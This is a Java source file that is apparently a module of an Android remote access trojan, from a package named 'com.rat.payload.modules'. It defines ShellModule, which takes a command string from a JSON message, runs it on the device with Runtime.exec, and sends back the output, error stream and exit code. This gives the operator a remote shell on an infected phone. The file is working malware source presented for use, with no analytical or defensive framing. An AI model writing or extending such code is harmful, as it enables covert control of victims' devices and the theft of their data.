package com.rat.payload.modules;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ShellModule implements CommandHandler.Command {

    private static final String TAG = "ShellModule";
    private Context context;

    public ShellModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        try {
            String command = args.getString("command");
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            while ((line = errReader.readLine()) != null) {
                output.append("ERR: ").append(line).append("\n");
            }
            process.waitFor();
            result.put("output", output.toString());
            result.put("exit_code", process.exitValue());
        } catch (Exception e) {
            Log.e(TAG, "shell error: " + e.getMessage());
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
